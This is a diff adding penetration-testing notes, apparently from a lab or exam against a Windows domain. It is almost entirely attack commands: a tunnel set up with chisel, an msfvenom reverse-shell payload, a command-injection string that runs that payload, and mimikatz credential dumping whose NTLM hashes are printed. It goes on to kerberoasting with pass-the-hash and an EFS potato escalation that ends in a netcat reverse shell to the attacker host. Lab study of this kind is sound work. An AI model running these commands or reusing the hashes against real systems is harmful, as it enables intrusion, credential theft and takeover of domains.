@@ -98,6 +98,56 @@ sudo tcpdump -nvvvXi tun0 tcp port 8081
 iwr -uri http://192.168.45.217/chisel.exe -Outfile chisel.exe
 
 .\chisel.exe client 192.168.45.217:80 R:40000:10.10.76.254:40000
+# connect to this port locally, can't access from browser
+nc 127.0.0.1 40000
+
+# create another shell on the target to exploit command injection
+cd C:\temp
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=8888 -f exe -o shell8888.exe
+nc -nvlp 9999
+iwr -uri http://192.168.45.217:8000/shell8888.exe -Outfile shell.exe
+
+# from the prompt on 40000 write config to inject the shell to get admin
+write_config 123';c:\temp\shell.exe '123
+
+# doesn't work, apparently not a domain user
+iwr -uri http://192.168.45.217:8000/SharpHound.ps1 -Outfile SharpHound.ps1
+powershell -ep bypass
+Import-Module .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:/Users/michelle
+
+# mimikatz
+iwr -uri http://192.168.45.217:8000/mimikatz.exe -Outfile mimikatz.exe
+. .\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::cache 
+token::elevate
+lsadump::sam
+
+MSSQL$MICROSOFT##WID
+fdb2ea0d22188397bdc0f08ba4081549
+
+Administrator
+17add237f30abaecc9d884f72958b928
+
+# kerberoast
+impacket-GetUserSPNs skylark.com/kiosk -hashes :92dd9eace3cf9ea33a95953aef6845ba -dc-ip 10.10.105.254 -request 
+impacket-GetUserSPNs skylark.com/Administrator -hashes :17add237f30abaecc9d884f72958b928 -dc-ip 10.10.105.254 -request
+
+# NOTE: need to be NT/authority system
+iwr -uri http://192.168.45.217:8000/Invoke-Kerberoast.ps1 -Outfile Invoke-Kerberoast.ps1
+powershell -ep bypass
+Import-Module .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast -Domain skylark.com
+
+# using EFS potato we can get a root shell on 9999
+iwr -uri http://192.168.45.217:8000/efspotato.cs -Outfile efspotato.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
+iwr -uri http://192.168.45.217:8000/nc.exe -Outfile nc.exe
+.\efspotato.exe "whoami"
+.\efspotato.exe "nc.exe 192.168.45.217 7777 -e cmd"
+
 ```
 
 .222
